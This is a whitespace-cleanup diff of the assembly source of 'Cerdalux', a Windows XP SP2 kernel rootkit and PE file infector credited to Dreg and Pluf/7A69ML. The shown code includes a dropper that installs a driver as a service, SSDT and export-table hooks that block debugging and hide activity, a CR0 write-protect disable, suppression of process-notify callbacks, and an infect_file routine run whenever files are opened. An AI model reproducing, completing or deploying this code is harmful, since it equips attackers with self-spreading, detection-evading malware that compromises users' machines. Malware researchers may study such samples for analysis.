@@ -4,24 +4,24 @@
 ; based from WinXPSP2.Cermalus by Pluf/7A69ML
 ;
 ; Authors:
-; 	- David Reguera Garcia aka Dreg dreg@fr33project.org https://www.fr33project.org
+;  - David Reguera Garcia aka Dreg dreg@fr33project.org https://www.fr33project.org
 ;
 
 ; masm32 (masm32v11r, MASM32 11 version) https://www.masm32.com/download.htm
 
 
-.586 ; rdtsc...                                    
-.model flat, stdcall                     
-option casemap :none                    
+.586 ; rdtsc...
+.model flat, stdcall
+option casemap :none
 
-include \masm32\include\windows.inc          
+include \masm32\include\windows.inc
 include \masm32\include\user32.inc
-include \masm32\include\kernel32.inc         
+include \masm32\include\kernel32.inc
 include \masm32\macros\macros.asm
-        
+
 includelib \masm32\lib\user32.lib
 includelib \masm32\lib\kernel32.lib
- 
+
 _pushad                     equ 8*4
 _pushad_eax                 equ 7*4
 _pushad_ecx                 equ 6*4
@@ -31,23 +31,23 @@ _pushad_esp                 equ 3*4
 _pushad_ebp                 equ 2*4
 _pushad_esi                 equ 1*4
 _pushad_edi                 equ 0*4
- 
+
 IMAGE_FILE_MACHINE_I386     equ 014Ch
- 
+
 IMAGE_SUBSYSTEM_NATIVE      equ 01h
 IMAGE_SUBSYSTEM_WINDOWS_GUI equ 02h
 IMAGE_SUBSYSTEM_WINDOWS_CUI equ 03h
- 
+
 IMAGE_FILE_EXECUTABLE_IMAGE equ 00002h
 IMAGE_FILE_32BIT_MACHINE    equ 00100h
 IMAGE_FILE_SYSTEM           equ 01000h
 IMAGE_FILE_DLL              equ 02000h
- 
+
 STATIC_PADD                 equ 4096
 DYNAMIC_PADD                equ 2048
- 
+
 ; dos header:
- 
+
 mzhdr struct
  mz_magic                   dw  05A4Dh
  mz_cblp                    dw  00090h
@@ -69,9 +69,9 @@ mzhdr struct
  mz_res2                    dw  10 dup (0)
  mz_lfanew                  dd  000000A8h
 mzhdr ends
- 
+
 ; dos stub:
- 
+
 dos_stub struct
  db 00Eh, 01Fh, 0BAh, 00Eh, 000h, 0B4h, 009h, 0CDh
  db 021h, 0B8h, 001h, 04Ch, 0CDh, 021h, 054h, 068h
@@ -87,16 +87,16 @@ dos_stub struct
  db 052h, 069h, 063h, 068h, 019h, 076h, 073h, 088h
  db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
 dos_stub ends
- 
+
 ; data directory entry:
- 
+
 pe_ddir struct
  ddir_rva                   dd  ?   ; 00h
  ddir_size                  dd  ?   ; 04h
 pe_ddir ends
- 
+
 ; export directory:
- 
+
 pedir_export struct
  flags                      dd  ?   ; 00h
  timedate                   dd  ?   ; 04h
@@ -110,9 +110,9 @@ pedir_export struct
  rvaofnames                 dd  ?   ; 20h
  rvaofordinals              dd  ?   ; 24h
 pedir_export ends
- 
+
 ; import directory:
- 
+
 pedir_import struct
  ilt                        dd  ?   ; 00h
  timedate                   dd  ?   ; 04h
@@ -120,14 +120,14 @@ pedir_import struct
  name_                      dd  ?   ; 0Ch
  iat                        dd  ?   ; 10h
 pedir_import ends
- 
+
 ; PE header:
- 
+
 pehdr struct
- 
+
  ; signature:
  pe_signature               dd  00004550h
- 
+
  ; file header:
  pe_coff_machine            dw  0014Ch
  pe_coff_numofsects         dw  00001h
@@ -136,7 +136,7 @@ pehdr struct
  pe_coff_symcount           dd  000000000h
  pe_coff_ophdrsize          dw  000E0h
  pe_coff_flags              dw  0010Eh
- 
+
  ; optional header:
  pe_ophdr_magic             dw  0010Bh
  pe_ophdr_majorlink         db  005h
@@ -155,7 +155,7 @@ pehdr struct
  pe_ophdr_majorimagev       dw  00000h
  pe_ophdr_minorimagev       dw  00000h
  pe_ophdr_majorsubsv        dw  00004h
- pe_ophdr_minorsubsv        dw  00000h 
+ pe_ophdr_minorsubsv        dw  00000h
  pe_ophdr_unknown           dd  000000000h
  pe_ophdr_imagesize         dd  (offset drv_end - offset drv_begin)
  pe_ophdr_hdrsize           dd  000000200h
@@ -168,7 +168,7 @@ pehdr struct
  pe_ophdr_heapcommitsize    dd  00001000h
  pe_ophdr_loaderflags       dd  00000000h
  pe_ophdr_rvaandsizecount   dd  00000010h
- 
+
  ; data directory []
  pe_dd_export               pe_ddir <?>
  pe_dd_import               pe_ddir <?>
@@ -187,9 +187,9 @@ pehdr struct
  pe_dd_com                  pe_ddir <?>
  pe_dd_rsrv                 pe_ddir <?>
 pehdr ends
- 
+
 ; section table entry:
- 
+
 pe_sect struct
  sect_name                  db  2Eh, 74h, 65h, 78h, 74h, 3 dup(0)
  sect_virtsize              dd  (offset drvcode_end - offset drvcode_begin)
@@ -202,15 +202,15 @@ pe_sect struct
  sect_linecount             dw  00000h
  sect_flags                 dd  068000020h
 pe_sect ends
- 
+
 ; section table:
- 
+
 sectbl struct
 text                        pe_sect <>
 sectbl ends
- 
+
 ; basic .sys file format:
- 
+
 sys_body struct
  sys_mz_hdr                 mzhdr       <>
  sys_dos                    dos_stub    <>
@@ -218,20 +218,20 @@ sys_body struct
  sys_sectbl                 sectbl      <>
  sys_pad                    dd 14 dup(0)
 sys_body ends
- 
+
  ;-------------------------------------
  ; ring0 data
  ;-------------------------------------
- 
+
 ; ring0 apis structs:
- 
+
 api_entry struct
  va                         dd  ?
  eat                        dd  ?
 api_entry ends
- 
+
 ; apis ntoskrnl.exe:
- 
+
 ntosapi struct
  DbgPrint                   api_entry <>
  DbgPrintEx                 api_entry <>
@@ -260,7 +260,7 @@ ntosapi struct
  ProbeForWrite              api_entry <>
  PsRemoveCreateThreadNotifyRoutine  api_entry <>
  PsSetCreateProcessNotifyRoutine    api_entry <>
- PsSetCreateThreadNotifyRoutine     api_entry <> 
+ PsSetCreateThreadNotifyRoutine     api_entry <>
  ZwClose                    api_entry <>
  ZwCreateSection            api_entry <>
  ZwMapViewOfSection         api_entry <>
@@ -271,18 +271,18 @@ ntosapi struct
  wcscmp                     api_entry <>
 ntosapi ends
 ntos_api_count              equ (size ntosapi) shr 2
- 
+
 ; api hall.dll:
- 
+
 halapi struct
  KeAcquireSpinLock          api_entry <>
  KeGetCurrentIrql           api_entry <>
  KeReleaseSpinLock          api_entry <>
 halapi ends
 hal_api_count               equ (size halapi) shr 2
- 
+
 ; ring0api:
- 
+
 ring0api struct
  ntos_base                  dd  ?
  ntos        ntosapi        <>
@@ -290,23 +290,23 @@ ring0api struct
  hal         halapi         <>
  ring0api ends
 ring0_api_count             equ (size ring0api) shr 2
- 
+
 ; ring0 nt services:
- 
+
 ntserv_entry struct
  va                         dd  ?
  ssdt                       dd  ?
 ntserv_entry ends
- 
+
 ntservices struct
  NtDebugActiveProcess       ntserv_entry <>
  NtEnumerateBootEntries     ntserv_entry <>
  NtOpenFile                 ntserv_entry <>
 ntservices ends
 ntservices_count            equ (size ntservices) shr 2
- 
+
 ; ring0data:
- 
+
 ring0data struct
  api             ring0api    <>
  ntdll_map_base              dd  ?
@@ -319,24 +319,24 @@ ring0data struct
  kspinlock                   dd  ?
  reserved                    dd 4 dup(?)
 ring0data ends
- 
+
  ;--------------------------------------
  ; ring0 include
  ;--------------------------------------
- 
+
 ; ntstauts:
- 
+
 STATUS_SUCCESS                  equ 000000000h
 STATUS_UNSUCCESSFUL             equ 0C0000001h
 STATUS_NOT_IMPLEMENTED          equ 0C0000002h
 STATUS_IMAGE_NOT_AT_BASE        equ 040000003h
- 
+
 ; bugcheck code:
- 
+
 POWER_FAILURE_SIMULATE          equ 0000000E5h
- 
+
 ; major function codes for IRPs:
- 
+
 IRP_MJ_CREATE                   equ 00h
 IRP_MJ_CREATE_NAMED_PIPE        equ 01h
 IRP_MJ_CLOSE                    equ 02h
@@ -367,9 +367,9 @@ IRP_MJ_SET_QUOTA                equ 1Ah
 IRP_MJ_PNP                      equ 1Bh
 IRP_MJ_PNP_POWER                equ IRP_MJ_PNP
 IRP_MJ_MAXIMUM_FUNCTION         equ 1Bh
- 
+
 ; values for the Attributes field:
- 
+
 OBJ_INHERIT                     equ 00000002h
 OBJ_PERMANENT                   equ 00000010h
 OBJ_EXCLUSIVE                   equ 00000020h
@@ -378,78 +378,78 @@ OBJ_OPENIF                      equ 00000080h
 OBJ_OPENLINK                    equ 00000100h
 OBJ_KERNEL_HANDLE               equ 00000200h
 OBJ_VALID_ATTRIBUTES            equ 000003F2h
- 
+
 NtCurrentProcess                equ -1
 NtCurrentThread                 equ -2
- 
+
 ; (enum) pool type:
- 
+
 NonPagedPool                    equ 0
 PagedPool                       equ 1
- 
+
 ; (enum) lock operation:
- 
+
 IoReadAccess                    equ 0
 IoWriteAccess                   equ 1
 IoModifyAccess                  equ 2
- 
+
 ; (enum) mode:
- 
+
 KernelMode                      equ 0
 UserMode                        equ 1
 MaximumMode                     equ 2
- 
+
 STANDARD_RIGHTS_REQUIRED        equ 000F0000h
 FILE_DIRECTORY_FILE             equ 00000001h
 FILE_SYNCHRONOUS_IO_NONALERT    equ 020h
 FileStandardInformation         equ 5
- 
+
 ; (enum) section inherit:
- 
+
 ViewShare                       equ 1
 ViewUnmap                       equ 2
- 
+
 ; Interrupt Request Level (IRQL):
- 
+
 KIRQL           typedef BYTE
 PKIRQL          typedef PTR BYTE
- 
+
 ; Spin Lock:
- 
+
 KSPIN_LOCK      typedef DWORD ; ULONG_PTR
 PKSPIN_LOCK     typedef PTR DWORD
- 
+
 ; list entry:
- 
+
 list_entry struct           ; size = 08h
  Flink                      dd  ?   ; 00h
  Blink                      dd  ?   ; 04h
 list_entry ends
- 
+
 ; unicode string:
- 
+
 unicode_string struct       ; size = 08h
  _Length                    dw  ?   ; 00h
  MaximumLength              dw  ?   ; 02h
  Buffer                     dd  ?   ; 04h
 unicode_string ends
- 
+
 ; large integer:
- 
+
 large_integer struct        ; size = 08h
  LowPart                    dd  ?   ; 00h
  HighPart                   dd  ?   ; 04h
 large_integer ends
- 
+
 ; io status block:
- 
+
 io_status_block struct      ; size = 08h
  Status                     dd  ?   ; 00h
  Information                dd  ?   ; 04h
 io_status_block ends
- 
+
 ; memory descriptor list:
- 
+
 mdl struct                  ; size = 01Ch
  Next                       dd  ?   ; 00h
  _Size                      dw  ?   ; 04h
@@ -460,9 +460,9 @@ mdl struct                  ; size = 01Ch
  ByteCount                  dd  ?   ; 14h
  ByteOffset                 dd  ?   ; 18h
 mdl ends
- 
+
 ; driver extension:
- 
+
 driver_extension struct     ; size = 18h
  DriverObject               dd  ?   ; 00h
  AddDevice                  dd  ?   ; 04h
@@ -471,9 +471,9 @@ driver_extension struct     ; size = 18h
  ClientDriverExtension      dd  ?   ; 14h
  FsFilterCallbacks          dd  ?   ; 18h
 driver_extension ends
- 
+
 ; driver object:
- 
+
 driver_object struct        ; size = 0A8h
  _Type                      dw  ?   ; 00h
  _Size                      dw  ?   ; 04h
@@ -483,24 +483,24 @@ driver_object struct        ; size = 0A8h
  DriverSize                 dd  ?   ; 10h
  DriverSection              dd  ?   ; 14h
  DriverExtension            dd  ?   ; 18h
- DriverName      unicode_string <>	; 1Ch
+ DriverName      unicode_string <> ; 1Ch
  HardwareDatabase           dd  ?   ; 24h
  FastIoDispatch             dd  ?   ; 28h
  DriverInit                 dd  ?   ; 2Ch
  DriverStartIo              dd  ?   ; 30h
  DriverUnload               dd  ?   ; 34h
- MajorFunction		        dd  (IRP_MJ_MAXIMUM_FUNCTION + 1) dup(?)	; 0038h
+ MajorFunction          dd  (IRP_MJ_MAXIMUM_FUNCTION + 1) dup(?) ; 0038h
 driver_object ends
- 
+
 ; object directory entry:
- 
+
 object_directory_entry struct   ; size = 08h
  ChainLink                  dd  ?   ; 00h
  Object                     dd  ?   ; 04h
 object_directory_entry ends
- 
+
 ; object directory:
- 
+
 object_directory struct     ; size = 0A2h
  HashBuckets                dd  37 dup(?) ; 00h
  _Lock                      dd  ?   ; 094h
@@ -509,9 +509,9 @@ object_directory struct     ; size = 0A2h
  Reserved                   dw  ?   ; 0A0h
  SymbolicLinkUsageCount     dw  ?   ; 0A2h
 object_directory ends
- 
+
 ; object header:
- 
+
 object_header struct        ; size = 018h
  PointerCount               dd  ?   ; 00h
  HandleCount                dd  ?   ; 04h
@@ -526,18 +526,18 @@ object_header struct        ; size = 018h
  SecurityDescriptor         dd  ?   ; 14h
  Body                       dd  ?   ; 18h
 object_header ends
- 
+
 ; ServiceDescriptorEntry:
- 
+
 service_descriptor_entry struct ; size = 10h
  ServiceTableBase           dd  ?   ; 00h
  ServiceCounterTableBase    dd  ?   ; 04h
  NumberOfServices           dd  ?   ; 08h
  ParamTableBase             dd  ?   ; 0Ch
 service_descriptor_entry ends
- 
+
 ; deferred procedure call (DPC) object:
- 
+
 kdpc struct                 ; size = 020h
  _Type                      dw  ?   ; 00h
  Number                     db  ?   ; 02h
@@ -549,9 +549,9 @@ kdpc struct                 ; size = 020h
  SystemArgument2            dd  ?   ; 18h
  _Lock                      dd  ?   ; 1Ch
 kdpc ends
- 
+
 ; timer object:
- 
+
 ktimer struct               ; size = 028h
  Header                     dd 4 dup(?) ; 00h
  DueTime                    large_integer   <>  ; 10h
@@ -559,9 +559,9 @@ ktimer struct               ; size = 028h
  Dpc                        dd  ?   ; 20h
  Period                     dd  ?   ; 24h
 ktimer ends
- 
+
 ; object attributes:
- 
+
 object_attributes struct    ; size = 18h
  _Length                    dd  ?   ; 00h
  RootDirectory              dd  ?   ; 04h
@@ -570,9 +570,9 @@ object_attributes struct    ; size = 18h
  SecurityDescriptor         dd  ?   ; 10h
  SecurityQualityOfService   dd  ?   ; 14h
 object_attributes ends
- 
+
 ; file standard information:
- 
+
 file_standard_information struct    ; size = 018h
  AllocationSize large_integer   <>  ; 00h
  EndOfFile      large_integer   <>  ; 08h
@@ -581,9 +581,9 @@ file_standard_information struct    ; size = 018h
  Directory                  db  ?   ; 15h
                             db  2 dup(?)
 file_standard_information ends
- 
+
 ; thread information block, XPSP2 version:
- 
+
 nt_tib struct               ; sizeof = 1Ch
  ExceptionList              dd  ?   ; 00h
  StackBase                  dd  ?   ; 04h
@@ -591,14 +591,14 @@ nt_tib struct               ; sizeof = 1Ch
  SubSystemTib               dd  ?   ; 0Ch
  union
   FiberData                 dd  ?   ; 10h
-  Version                   dd  ?   ; 10h   
+  Version                   dd  ?   ; 10h
  ends
  ArbitraryUserPointer       dd  ?   ; 14h
  Self                       dd  ?   ; 18h
 nt_tib ends
- 
+
 ; processor control region, XPSP2 version:
- 
+
 kpcr struct                 ; size = 54h
  NtTib                      nt_tib  <>  ; 00h
  SelfPcr                    dd  ?   ; 1Ch
@@ -619,9 +619,9 @@ kpcr struct                 ; size = 54h
  Number                     db  ?   ; 51h
                             db 2 dup(?) ; 052
 kpcr ends
- 
+
 ; PsLoadedModuleList module entry
- 
+
 module_entry struct
  list                       list_entry <>
  unk1                       dd 4 dup(?)
@@ -632,21 +632,21 @@ module_entry struct
  _name                      unicode_string  <>
  ; ...
 module_entry ends
- 
+
 ; offset KPCR->KdVersionBlock, XPSP2 version:
- 
+
 KPCR_KDVERSIONBLOCK_OFFSET  equ 034h
- 
+
 ; kernel debug data header32, XPSP2 version:
- 
+
 dbgkd_debug_data_header32 struct    ; size = 0Ch
  List                       list_entry  <>  ; 00h
  OwnerTag                   dd  ?   ; 08h
  _size                      dd  ?   ; 0Ch
 dbgkd_debug_data_header32 ends
- 
+
 ; kernel debugger data32, XPSP2 version:
- 
+
 kddebugger_data32 struct
  Header                         dbgkd_debug_data_header32   <>
  KernBase                       dd  ?
@@ -655,80 +655,80 @@ kddebugger_data32 struct
  ThCallbackStack                dw  ?
  NextCallback                   dw  ?
  FramePointer                   dw  ?
- PaeEnabled                     dw  ?   
+ PaeEnabled                     dw  ?
  KiCallUserMode                 dd  ?
- KeUserCallbackDispatcher       dd  ?    
- PsLoadedModuleList             dd  ?     
+ KeUserCallbackDispatcher       dd  ?
+ PsLoadedModuleList             dd  ?
  PsActiveProcessHead            dd  ?
- PspCidTable                    dd  ?    
+ PspCidTable                    dd  ?
  ExpSystemResourcesList         dd  ?
  ExpPagedPoolDescriptor         dd  ?
- ExpNumberOfPagedPools          dd  ?    
+ ExpNumberOfPagedPools          dd  ?
  KeTimeIncrement                dd  ?
  KeBugCheckCallbackListHead     dd  ?
- KiBugcheckData                 dd  ?    
- IopErrorLogListHead            dd  ?    
+ KiBugcheckData                 dd  ?
+ IopErrorLogListHead            dd  ?
  ObpRootDirectoryObject         dd  ?
- ObpTypeObjectType              dd  ?    
- MmSystemCacheStart             dd  ?      
+ ObpTypeObjectType              dd  ?
+ MmSystemCacheStart             dd  ?
  MmSystemCacheEnd               dd  ?
- MmSystemCacheWs                dd  ?    
+ MmSystemCacheWs                dd  ?
  MmPfnDatabase                  dd  ?
  MmSystemPtesStart              dd  ?
  MmSystemPtesEnd                dd  ?
  MmSubsectionBase               dd  ?
- MmNumberOfPagingFiles          dd  ?        
+ MmNumberOfPagingFiles          dd  ?
  MmLowestPhysicalPage           dd  ?
  MmHighestPhysicalPage          dd  ?
- MmNumberOfPhysicalPages        dd  ?    
- MmMaximumNonPagedPoolInBytes   dd  ?   
+ MmNumberOfPhysicalPages        dd  ?
+ MmMaximumNonPagedPoolInBytes   dd  ?
  MmNonPagedSystemStart          dd  ?
  MmNonPagedPoolStart            dd  ?
- MmNonPagedPoolEnd              dd  ?    
+ MmNonPagedPoolEnd              dd  ?
  MmPagedPoolStart               dd  ?
  MmPagedPoolEnd                 dd  ?
  MmPagedPoolInformation         dd  ?
- MmPageSize                     dd  ?    
- MmSizeOfPagedPoolInBytes       dd  ?    
+ MmPageSize                     dd  ?
+ MmSizeOfPagedPoolInBytes       dd  ?
  MmTotalCommitLimit             dd  ?
  MmTotalCommittedPages          dd  ?
  MmSharedCommit                 dd  ?
  MmDriverCommit                 dd  ?
  MmProcessCommit                dd  ?
  MmPagedPoolCommit              dd  ?
- MmExtendedCommit               dd  ?    
+ MmExtendedCommit               dd  ?
  MmZeroedPageListHead           dd  ?
  MmFreePageListHead             dd  ?
  MmStandbyPageListHead          dd  ?
  MmModifiedPageListHead         dd  ?
  MmModifiedNoWritePageListHead  dd  ?
  MmAvailablePages               dd  ?
- MmResidentAvailablePages       dd  ?       
+ MmResidentAvailablePages       dd  ?
  PoolTrackTable                 dd  ?
- NonPagedPoolDescriptor         dd  ?    
+ NonPagedPoolDescriptor         dd  ?
  MmHighestUserAddress           dd  ?
  MmSystemRangeStart             dd  ?
  MmUserProbeAddress             dd  ?
  KdPrintCircularBuffer          dd  ?
  KdPrintCircularBufferEnd       dd  ?
- KdPrintWritePointer            dd  ?   
+ KdPrintWritePointer            dd  ?
  KdPrintRolloverCount           dd  ?
  MmLoadedUserImageList          dd  ?
 kddebugger_data32 ends
- 
+
  ;--------------------------------------
  ; ring3 data
  ;--------------------------------------
- 
+
 ; ring3 apis structs:
- 
+
 api_entry struct
  va                         dd  ?
  eat                        dd  ?
 api_entry ends
- 
+
 ; apis kernel32.dll:
- 
+
 kernapi struct
  CloseHandle                api_entry <>
  CreateFileA                api_entry <>
@@ -743,16 +743,16 @@ kernapi struct
  WriteFile                  api_entry <>
 kernapi ends
 kern_api_count              equ  (size kernapi) shr 2
- 
+
 ; apis ntdll.dll:
- 
+
 ntdllapi struct
  ZwEnumerateBootEntries     api_entry <>
 ntdllapi ends
 ntdll_api_count             equ (size ntdllapi) shr 2
- 
+
 ; apis advapi32.dll:
- 
+
 advapi struct
  CloseServiceHandle         api_entry <>
  ControlService             api_entry <>
@@ -763,9 +763,9 @@ advapi struct
  StartServiceA              api_entry <>
 advapi ends
 adv_api_count               equ (size advapi) shr 2
- 
+
 ; ring3api:
- 
+
 ring3api struct
  kern_base                  dd  ?
  kern        kernapi        <>
@@ -775,9 +775,9 @@ ring3api struct
  ntdll       ntdllapi       <>
 ring3api ends
 ring3_api_count             equ (size ring3api) shr 2
- 
+
 ; ring3data:
- 
+
 ring3data struct
  api         ring3api       <>
  file_handle                dd  ?
@@ -787,13 +787,13 @@ ring3data struct
  service_handle             dd  ?
  buff                       dd  ?
 ring3data ends
- 
+
  ;--------------------------------------
  ; ring3 include
  ;--------------------------------------
- 
+
 ; service status:
- 
+
 service_status struct       ; size = 01Ch
  dwServiceType              dd  ?   ; 00h
  dwCurrentState             dd  ?   ; 04h
@@ -803,49 +803,49 @@ service_status struct       ; size = 01Ch
  dwCheckPoint               dd  ?   ; 14h
  dwWaitHint                 dd  ?   ; 18h
 service_status ends
- 
+
  ;--------------------------------------
  ; hooks/callbacks data
  ;--------------------------------------
- 
+
 hook_data_offset        equ 0Bh
- 
+
 hook_data struct
-signature                   dd  ? 
-return_                     dd  ? 
+signature                   dd  ?
+return_                     dd  ?
 hook_data ends
- 
+
 pssetcreateprocessnotifyroutine_param_count         equ 02h
 pssetremovecreatethreadnotifyroutine_params_count   equ 01h
 ntdebugactiveprocess_param_count    equ 02h
 ntenumeratebootentries_param_count  equ 02h
-ntopenfile_param_count              equ 06h 
+ntopenfile_param_count              equ 06h
 custom_dpc_param_count              equ 04h
 driverentry_param_count             equ 02h
 driverunload_param_count            equ 01h
- 
+
  ;--------------------------------------
  ; DPC wdog context
  ;--------------------------------------
- 
+
 wdog_context struct
  Dpc                        kdpc    <>  ; 00h
  Timer                      ktimer  <>  ; 20h
  data                           dd  ?   ; 48h
 wdog_context ends
- 
+
  ;--------------------------------------
  ; macros
  ;--------------------------------------
- 
+
 ; get callback parameter:
- 
+
 @gparam macro reg, pnum
         mov reg, dword ptr [esp + _pushad + 4 + (pnum * 4)]
 endm
- 
+
 ; initialize object attributes:
- 
+
 @init_object_attributes macro p, r, n, a, s
         mov     dword ptr [p + object_attributes._Length], size object_attributes
         mov     dword ptr [p + object_attributes.RootDirectory], r
@@ -854,25 +854,25 @@ endm
         mov     dword ptr [p + object_attributes.SecurityDescriptor], s
         mov     dword ptr [p + object_attributes.SecurityQualityOfService], s
 endm
- 
+
 ; ring0 callback begin:
- 
+
 @cb_begin macro
         pushad                                              ; save initial registers
         call    getdelta                                    ; get delta offset: ebp
         mov     ebx, dword ptr [ebp]                        ; get ptr to ring0data: ebx
 endm
- 
+
 ; ring0 callback end:
- 
+
 @cb_end macro args
         mov     dword ptr [esp + _pushad_eax], eax          ; set ret value: eax
         popad                                               ; restore initial registers
         ret (args * 4)                                      ; clean stack: stdcall args >= 0, cdecl args = 0
 endm
- 
+
 ; disable page protection:
- 
+
 @unprotect_mring0 macro
         cli
         push    eax
@@ -881,9 +881,9 @@ endm
         mov     cr0, eax
         pop     eax
 endm
- 
+
 ; enable page protection:
- 
+
 @protect_mring0 macro
         push    eax
         mov     eax, cr0
@@ -892,30 +892,30 @@ endm
         pop     eax
         sti
 endm
- 
+
 ; end string:
- 
+
 @endsz macro
         local   nxtchr
 nxtchr: lodsb
         test    al,al
         jnz     nxtchr
 endm
- 
+
  ;--------------------------------------
  ; SEH
  ;--------------------------------------
- 
+
 except_handler struct
  EH_Dummy                   dd  ?
- EH_ExceptionRecord         dd  ? 
+ EH_ExceptionRecord         dd  ?
  EH_EstablisherFrame        dd  ?
  EH_ContextRecord           dd  ?
  EH_DispatcherContext       dd  ?
 except_handler ends
- 
+
 ; create seh frame:
- 
+
 @ring3seh_setup_frame macro handler
         local   set_new_eh
         call    set_new_eh
@@ -925,15 +925,15 @@ set_new_eh:     assume fs:nothing
         push    fs:[0]
         mov     fs:[0], esp
 endm
- 
+
 ; remove seh frame:
- 
+
 @ring3seh_remove_frame macro
         assume  fs:nothing
         pop     fs:[0]
         add     esp, 4
 endm
- 
+
         ;--------------------------------------
         ; dropper code
         ;--------------------------------------
@@ -1066,10 +1066,10 @@ api_names_begin:
         db  "VirtualAlloc",             0h
         db  "VirtualFree",              0h
         db  "WriteFile",                0h
-        db  "kernel32.dll",             0h 
+        db  "kernel32.dll",             0h
         ; advapi.dll:
         dd  offset advapicrc_begin
-        db  (adv_api_count shr 1) 
+        db  (adv_api_count shr 1)
         db  "CloseServiceHandle",       0h
         db  "ControlService",           0h
         db  "CreateServiceA",           0h
@@ -1087,19 +1087,19 @@ api_names_end:
         dd  0
 _title  db  "[Cerdalux by Dreg, Pluf/7A69ML]",0h
 _text   db  "[first step]",0h
- 
+
         ;--------------------------------------
         ; driver begin
         ;--------------------------------------
- 
+
 drv_begin:
 driver      sys_body        <>
 drvcode_begin:
- 
+
         ;--------------------------------------
         ; driver entry
         ;--------------------------------------
- 
+
         ; system thread context: passive_level: stdcall: ntstatus: 2params
 driver_entry:
         pushad
@@ -1239,7 +1239,7 @@ next_entry:
 get_ntservices_unmap_ntdll:
         pop     esi
         pop     edi
-        call    unmap_section_ring0        
+        call    unmap_section_ring0
 get_ntservices_end:
 raise_irql:
         lea     esi, dword ptr [ebx + ring0data.kirql]
@@ -1293,11 +1293,11 @@ hook_exported_apis:
         call    hook_functions
         jmp     hook_eat_begin
 hook_exported_api_end:
- 
+
         ; in:
         ;   esi = ptr hook table info
         ; out: nothing
- 
+
 hook_functions:
 hook_next_function:
         lodsd
@@ -1550,21 +1550,21 @@ drv_entry_unsuccess:
         pop     eax
 drv_entry_ret:
         @cb_end driverentry_param_count
- 
+
         ;--------------------------------------
         ; driver unload
         ;--------------------------------------
- 
+
         ; driver unload:
         ; system thread context: passive level: stdcall: void: 1param
 driver_unload:
         @cb_begin
         @cb_end driverunload_param_count
- 
+
         ;--------------------------------------
         ; service hook routines
         ;--------------------------------------
- 
+
         ; NtOpenFile hook:
         ; user thread context: passive level: stdcall: ntstatus: 14params
 nt_open_file_hook:
@@ -1650,11 +1650,11 @@ is_wnd: mov     al, byte ptr [edi]
         mov     eax, dword ptr [eax]
         push    edx
         call    infect_file
-        pop     edx                
+        pop     edx
 ntopenfile_ret:
         mov     eax, edx
         @cb_end ntopenfile_param_count
- 
+
         ; NtEnumerateBootEntries hook:
         ; user thread context: passive level: ntstatus: stdcall: 2params
 nt_enumerate_boot_entries_hook:
@@ -1679,7 +1679,7 @@ nt_enumerate_boot_entries_hook:
         jnz     @l1
         xor     eax, eax
 @l1:    @cb_end ntenumeratebootentries_param_count
- 
+
         ; NtDebugActiveProcess hook:
         ; user thread context: passive level: ntstatus: stdcall: 2params
 nt_debug_active_process_hook:
@@ -1694,11 +1694,11 @@ nt_debug_active_process_hook:
         push    STATUS_INVALID_HANDLE
         pop     eax
         @cb_end ntdebugactiveprocess_param_count
- 
+
         ;--------------------------------------
         ; exported api hook routines
         ;--------------------------------------
- 
+
         ; DbgPrint/DbgPrintEx/DbgPrintReturnControlC hook:
         ; arbitrary thread context: any IRQL: cdecl: ulong(ntstatus): 1-Nparams
 api_ntos_dbg_print_hook:
@@ -1715,11 +1715,11 @@ api_ntos_dbg_print_return_controlc_hook:
         push    STATUS_SUCCESS
         pop     eax
         @cb_end 0
- 
+
         ;--------------------------------------
         ; EAT hook routines
         ;--------------------------------------
- 
+
         ; PsSetCreateProcessNofityRoutine hook:
         ; arbitrary thread context: passive level: stdcall: ntstatus: 2params
 api_ntos_ps_set_create_process_notify_routine_hook:     ; register/unregister callback
@@ -1727,7 +1727,7 @@ api_ntos_ps_set_create_process_notify_routine_hook:     ; register/unregister ca
         push    STATUS_SUCCESS
         pop     eax
         @cb_end pssetcreateprocessnotifyroutine_param_count
- 
+
         ; PsSet/RemoveCreateThreadNotifyRoutine hook:
         ; arbitrary thread context: passive level: stdcall: ntstatus: 1param
 api_ntos_ps_set_create_thread_notify_routine_hook:      ; register callback
@@ -1736,11 +1736,11 @@ api_ntos_ps_remove_create_thread_notify_routine_hook:   ; unregister callback
         push    STATUS_SUCCESS
         pop     eax
         @cb_end pssetremovecreatethreadnotifyroutine_params_count
- 
+
         ;--------------------------------------
         ; wdog routine (CustomTimerDpc)
         ;--------------------------------------
- 
+
         ; system thread context: dispatch level: stdcall: void: 4params
 ring0_wdog_begin:
         pushad
@@ -1784,14 +1784,14 @@ api_ntos_ke_initialize_timer    equ $-4
 api_ntos_ke_set_timer   equ $-4
         call    eax
         @cb_end custom_dpc_param_count
- 
+
         ; in:
         ;   eax = ptr api name string, ptr begin data buf
         ;   edi = ptr end data buf
         ; out:
         ;   eax = api crc
         ; (orig by roy g biv)
- 
+
 gen_crc32_datbuf:
         push    edi
         cmp     edi, eax
@@ -1831,15 +1831,15 @@ l2:     xchg    eax, ebx
 gen_crc32_end:
         ret
 ring0_wdog_end:
- 
+
         ; PE infecction routine:
-		;
+  ;
         ; in:
         ;   ebx = ptr ring0data
         ;   ebp = delta offset
         ;   eax = handle of file to infect
         ; out: nothing
- 
+
 infect_file:
         mov     edi, eax
         mov     ecx, esp
@@ -1911,7 +1911,7 @@ infect_file:
         call    unmap_section_ring0
         pop     esi
         pop     edi
-        rdtsc 
+        rdtsc
         and     eax, DYNAMIC_PADD - 1
         add     esi, eax
         add     esi, STATIC_PADD
@@ -1963,7 +1963,7 @@ infect_file_unmap:
 infect_file_ret:
         mov     ebx, dword ptr [ebp]
         ret
- 
+
         ; in:
         ;   edi = handle file to map
         ;   esi = section size, with padd
@@ -1975,7 +1975,7 @@ infect_file_ret:
         ; ret:
         ;   ok:     eax = 0
         ;   error:  eax != 0
- 
+
 map_file_ring0:
         xor     ecx, ecx
         mov     eax, esp
@@ -2025,7 +2025,7 @@ map_file_ring0:
         inc     eax
 map_file_ring0_ret:
         ret
- 
+
         ; in:
         ;   eax = ptr full path name (wchar)
         ; out:
@@ -2034,7 +2034,7 @@ map_file_ring0_ret:
         ; ret:
         ;   ok:     eax = 0
         ;   error:  eax != 0
- 
+
 map_imagefile_ring0:
         mov     edx, esp
         push    eax
@@ -2106,12 +2106,12 @@ map_imagefile_ring0:
         inc     eax
 map_imagefile_ring0_ret:
         ret
- 
+
         ; in:
         ;   esi = bade addr
         ;   edi = section handle
         ; out:  nothing
- 
+
 unmap_section_ring0:
         push    esi
         push    NtCurrentProcess
